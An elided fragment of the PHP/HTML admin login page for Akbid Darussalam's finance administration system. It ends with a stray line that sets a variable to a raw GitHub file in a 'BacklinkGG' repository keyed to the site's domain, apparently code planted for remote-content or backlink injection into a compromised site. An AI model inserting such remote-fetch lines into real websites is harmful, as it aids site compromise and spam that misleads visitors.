...
<head>
	...
	<title>Akbid Darussalam Lhokseumawe :: Administrator Login ::</title>
...
<body>
	...
	<div id="wrapper">
		<center><img src="logologin.png" ></center>
		<p align="center" style="font-size: 15px; font-weight: bold;">Sistem Informasi Administrasi Keuangan Akbid Darussalam</p>
		<?php
		if ($_GET['code'] == 1){
		?>
		...
		<div id="powered">
		<p>Copyright &copy; 2017 Akbid Darussalam Lhokseumawe</p>
		</div>
	</div>
...
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/akbiddar/simkeu.akbiddarussalam.ac.id/system.txt';
